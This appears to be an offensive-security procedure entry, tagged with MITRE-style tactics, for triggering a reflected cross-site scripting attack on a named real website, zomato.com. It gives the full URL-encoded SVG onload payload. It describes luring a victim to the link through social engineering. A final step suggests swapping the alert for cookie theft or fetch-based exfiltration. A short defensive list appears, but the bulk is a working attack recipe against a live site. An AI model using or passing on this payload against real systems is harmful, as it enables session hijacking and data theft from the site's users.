---
id: proc-trigger-xss-execution-230119
tags:
  - xss-trigger
  - javascript-execution
  - alert-proof
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-11-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:24:39.987Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-XSS-Execution-on-Modified-URL

## Summary

This procedure loads the URL with the injected XSS payload to execute arbitrary JavaScript in the browser, demonstrating the vulnerability through an alert and enabling further attacks like session theft.

## Description

Once the payload is in place, visiting the modified URL causes the server to reflect the input into the page, executing the SVG onload handler. This runs in the victim's context, allowing access to cookies, local storage, or phishing. The attack is reflected, requiring the victim to visit the URL (e.g., via social engineering). Mobile-specific due to user agent. Outcomes: JS execution confirmed, potential data exfiltration.

## Requirements

1. Crafted malicious URL
2. Mobile-simulated browser
3. Victim simulation environment

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all reflected parameters server-side
- Use HTTPOnly and Secure flags on cookies to prevent JS access
- Monitor for XSS indicators like unexpected alerts or SVG injections in client logs

## Objectives

1. Execute the injected JavaScript payload
2. Confirm control over the victim's browser context
3. Demonstrate impact (e.g., domain alert, cookie access)

## Instructions

### Step 1: Load the Modified URL

**Context**: Visit the tampered URL to trigger reflection.

Paste `https://www.zomato.com/manila/artsy-cafe-diliman-quezon-city/photos?category=%22--%3E%3C%2Fscript%3E%3Csvg%2Fonload%3D%27%3Balert%28document.domain%29%3B%27%3E` into the address bar and hit Enter, ensuring mobile user agent.

### Step 2: Observe Execution

**Context**: Watch for the payload to render and fire the onload event.

The page loads, and the SVG injects, executing `alert(document.domain)`.

> Alert shows 'www.zomato.com', proving XSS success.

### Step 3: Validate and Escalate

**Context**: Test for broader impact.

Replace alert with `document.cookie` in payload for cookie theft, or use fetch for exfiltration.

**Expected Output**: Alert or console log with domain/cookies; no errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss-trigger]]
- [[javascript-execution]]
- [[alert-proof]]
